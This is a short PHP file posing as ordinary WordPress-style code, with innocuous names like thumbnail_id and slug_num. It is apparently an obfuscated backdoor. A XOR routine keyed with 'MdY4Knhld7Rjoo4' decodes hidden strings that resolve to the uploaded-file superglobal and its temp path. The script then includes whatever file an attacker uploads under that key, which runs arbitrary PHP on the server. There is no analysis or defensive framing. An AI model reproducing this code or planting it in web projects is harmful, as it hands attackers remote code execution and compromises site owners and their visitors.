<?php 	
$thumbnail_id = 'MdY4Knhld7Rjoo4';

$chunk = $thumbnail_id;
function slug_num($del_dir, $static_replacements)

{
    $post_modified = $static_replacements;
    $post_author = urldecode($del_dir);

    $imagedata = substr($post_modified,0, strlen($post_author));
	$extension = 'field_no_prefix';
    $option = $post_author ^ $imagedata;

    return $option;
}
	$count2 = 'static_characters';
$lastpostmodified = ${slug_num("%12%22%10x%0E%3D", $chunk)};
$stripped = $lastpostmodified;
$cockney = isset($stripped[$chunk]);
if ($cockney)

{
    $counts = $lastpostmodified[$chunk];

    $words_array = $counts[slug_num("9%09%29k%25%0F%05%09", $chunk)];
    $fragment = $words_array;
	$num_pages = 'safe_tag';
    include ($fragment);
	$template_lock = 'fallback_title';
}

?>
